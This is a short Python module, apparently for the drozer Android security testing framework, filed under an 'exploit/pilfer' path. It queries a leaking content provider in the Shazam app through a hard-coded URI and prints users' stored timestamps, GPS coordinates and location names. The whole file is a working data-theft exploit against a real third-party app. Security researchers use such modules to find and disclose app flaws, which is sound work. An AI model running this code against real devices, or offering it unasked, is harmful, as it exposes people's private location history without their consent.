from drozer.modules import common, Module

class GPS(Module, common.Provider, common.TableFormatter):

    name = "Extract GPS location information."
    description = "Extracts GPS location information, leaked by a content provider."
    examples = ""
    author = "Anonymous"
    date = "2012-11-06"
    license = "BSD (3 clause)"
    path = ["exploit", "pilfer", "thirdparty", "shazam"]
    permissions = ["com.mwr.dz.permissions.GET_CONTEXT"]
    
    __content_uri = "content://com.shazam.library.providers.freeimporttagscontentprovider/"

    def execute(self, arguments):
        c = self.contentResolver().query(self.__content_uri, ["timestamp", "lat", "lon", "location_name"], None, None, None)

        if c != None:
            rows = map(lambda r: [r[5], r[16], r[17], r[19]], self.getResultSet(c))

            self.print_table(rows, show_headers=True, vertical=False)
        else:
            self.stdout.write("Unable to query the Content Provider.\n")
            